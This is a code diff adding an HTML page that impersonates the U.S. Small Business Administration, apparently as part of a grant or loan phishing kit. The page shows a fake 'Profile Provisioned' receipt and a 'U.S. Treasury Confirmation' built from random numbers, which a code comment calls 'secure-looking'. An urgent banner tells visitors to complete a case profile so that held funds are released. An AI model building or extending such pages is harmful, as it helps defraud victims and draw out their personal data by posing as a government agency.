@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA Portal | Provisioning Success</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap');
+
+        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --sba-navy: #001a3d; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; -webkit-tap-highlight-color: transparent; }
+        
+        .sba-logo-box { position: relative; display: inline-block; padding: 4px 8px; }
+        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 5px; border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue); border-right: 3px solid var(--sba-blue); }
+        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 3px; background: var(--sba-red); }
+
+        .success-icon { width: 60px; height: 60px; background: white; color: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; margin: 0 auto 15px; border: 3px solid #22c55e; animation: scaleUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .receipt-card { background: white; border-radius: 4px; border-top: 5px solid var(--sba-blue); box-shadow: 0 15px 25px -5px rgba(0, 0, 0, 0.08); position: relative; overflow: hidden; }
+        
+        /* Certified Watermark */
+        .receipt-card::after { content: "CERTIFIED"; position: absolute; top: 30px; left: 50%; font-size: 40px; color: rgba(0, 46, 109, 0.03); font-weight: 900; transform: translateX(-50%) rotate(-15deg); pointer-events: none; white-space: nowrap; }
+
+        .receipt-row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px dashed #e2e8f0; padding-bottom: 6px; gap: 8px; }
+        .receipt-label { font-weight: 800; color: #94a3b8; text-transform: uppercase; font-size: 8px; letter-spacing: 1px; min-width: 80px; text-align: left; }
+        .receipt-value { color: var(--sba-navy); font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 10px; text-align: right; word-break: break-all; }
+
+        .urgent-note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px; border-radius: 4px; text-align: left; }
+        
+        @keyframes scaleUp { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .btn-portal { background: var(--sba-blue); border-bottom: 4px solid #001a3d; transition: all 0.2s; }
+        .btn-portal:active { transform: translateY(2px); border-bottom-width: 0; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <div class="bg-[#f0f0f0] text-[#444] text-[8px] py-2 px-5 flex items-center justify-between font-bold uppercase tracking-tight border-b border-gray-200">
+        <div class="flex items-center gap-2">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-3">
+            <span>Official Provisioning Receipt</span>
+        </div>
+        <span class="text-green-600">SECURE_HANDSHAKE</span>
+    </div>
+
+    <header class="bg-white border-b border-gray-200 py-3 px-6 flex justify-center shadow-sm">
+        <div class="flex items-center gap-2">
+            <div class="sba-logo-box">
+                <span class="text-lg font-black text-[#002e6d] tracking-tighter">SBA</span>
+            </div>
+            <div class="text-left">
+                <p class="text-[7px] font-black text-slate-400 uppercase leading-none">U.S. Small Business</p>
+                <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center p-5">
+        <div class="max-w-md w-full text-center">
+            
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+
+            <h2 class="text-xl font-black text-[#002e6d] mb-1 tracking-tighter uppercase">Profile Provisioned</h2>
+            <p class="text-slate-500 text-[9px] font-bold uppercase tracking-widest mb-6 px-4">
+                Identity Verified within the Federal Grant System (FGS)
+            </p>
+
+            <div class="receipt-card p-6 text-left mb-6 border border-slate-200">
+                <div class="receipt-row">
+                    <span class="receipt-label">Account Status</span>
+                    <span class="receipt-value text-orange-600 animate-pulse">PROVISIONAL_HOLD</span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Filing ID</span>
+                    <span class="receipt-value text-blue-700" id="trackingId">SBA-AUTH-PENDING</span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Allocation</span>
+                    <span class="receipt-value">EIDL-TARGETED-2026</span>
+                </div>
+                <div class="receipt-row" style="border: none; margin-bottom: 0;">
+                    <span class="receipt-label">Node Access</span>
+                    <span class="receipt-value text-[9px] opacity-60" id="encKey">...</span>
+                </div>
+            </div>
+
+            <div class="urgent-note mb-6">
+                <div class="flex gap-3">
+                    <i class="fas fa-info-circle text-orange-600 mt-0.5 text-xs"></i>
+                    <div>
+                        <h4 class="text-orange-800 font-black text-[9px] uppercase tracking-wider mb-1">Final Action Required</h4>
+                        <p class="text-[8.5px] text-orange-700 font-bold leading-relaxed uppercase">
+                            To lift the PROVISIONAL HOLD and release allocated funds, you must complete your full Case Profile in the dashboard.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <button onclick="window.location.href='dashboard.html'" class="btn-portal w-full text-white font-black py-4 rounded-sm shadow-lg uppercase tracking-[0.2em] text-[10px]">
+                Enter Secure Dashboard
+            </button>
+
+            <p class="mt-6 text-[8px] text-slate-400 font-bold uppercase tracking-widest">
+                U.S. Treasury Confirmation #<span id="receiptNum">...</span>
+            </p>
+        </div>
+    </main>
+
+    <footer class="py-4 text-center">
+         <p class="text-[7px] text-slate-300 font-bold uppercase tracking-[0.3em]">Authorized Personnel Only</p>
+    </footer>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                const shortId = user.uid.substring(0, 6).toUpperCase();
+                
+                // Generate secure-looking receipt IDs
+                document.getElementById('receiptNum').innerText = `${Math.floor(2000+Math.random()*7000)}-${shortId}`;
+                document.getElementById('encKey').innerText = `NODE-${shortId}-TLS1.3`;
+
+                try {
+                    const userDoc = await getDoc(doc(db, "users", user.uid));
+                    if (userDoc.exists() && userDoc.data().caseNumber) {
+                        document.getElementById('trackingId').innerText = userDoc.data().caseNumber;
+                    } else {
+                        document.getElementById('trackingId').innerText = `SBA-${shortId}-CERT`;
+                    }
+                } catch (e) { 
+                    document.getElementById('trackingId').innerText = `SBA-${shortId}-CERT`;
+                }
+            } else {
+                window.location.href = 'login.html';
+            }
+        });
+    </script>
+</body>
+</html>
